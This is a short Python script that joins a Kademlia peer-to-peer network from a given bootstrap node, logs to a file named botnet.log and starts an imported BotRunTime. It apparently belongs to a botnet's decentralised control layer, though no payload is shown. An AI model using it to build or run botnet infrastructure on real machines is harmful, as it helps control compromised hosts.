import logging
import asyncio
import sys

from run_bot import BotRunTime

from kademlia.network import Server

if len(sys.argv) != 3:
    print("Usage: python add_node.py <bootstrap node> <bootstrap port>")
    sys.exit(1)

handler = logging.FileHandler('/tmp/botnet.log')
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
log.setLevel(logging.DEBUG)

loop = asyncio.get_event_loop()
loop.set_debug(True)

server = Server()
server.listen(8469)
bootstrap_node = (sys.argv[1], int(sys.argv[2]))
loop.run_until_complete(server.bootstrap([bootstrap_node]))

BotRunTime(loop, server)
